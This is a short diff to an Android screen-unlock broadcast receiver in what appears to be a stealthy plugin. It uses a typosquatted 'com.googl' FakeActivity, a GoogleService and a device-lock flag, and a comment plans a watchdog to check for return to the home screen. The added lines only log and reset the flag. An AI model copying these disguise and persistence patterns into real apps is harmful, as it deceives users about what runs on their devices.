@@ -8,6 +8,8 @@ import android.content.Intent;
 import com.googl.plugin.x.FakeActivity;
 import com.plugin.common.utils.UtilsRuntime;
 import com.xstd.plugin.binddevice.DeviceBindBRC;
+import com.xstd.plugin.config.AppRuntime;
+import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.SettingManager;
 import com.xstd.plugin.service.GoogleService;
 import com.xstd.plugin.service.PluginService;
@@ -35,6 +37,14 @@ public class ScreenBRC extends BroadcastReceiver {
         if (intent != null && SettingManager.getInstance().getKeyHasBindingDevices()) {
             String action = intent.getAction();
             if (Intent.ACTION_USER_PRESENT.equals(action)) {
+                Config.LOGD("[[ScreenBRC::onReceive]] action = " + action);
+
+                if (AppRuntime.LOCK_DEVICE_AS_DISDEVICE) {
+//                    UtilsRuntime.goHome(context);
+                    AppRuntime.LOCK_DEVICE_AS_DISDEVICE = false;
+                    //TODO: 可以在此时启动一个看门狗service，来检查是否退到home
+                }
+
                 SettingManager.getInstance().init(context.getApplicationContext());
                 if (SettingManager.getInstance().getKeyActiveTime() == 0) {
                     //没有激活过
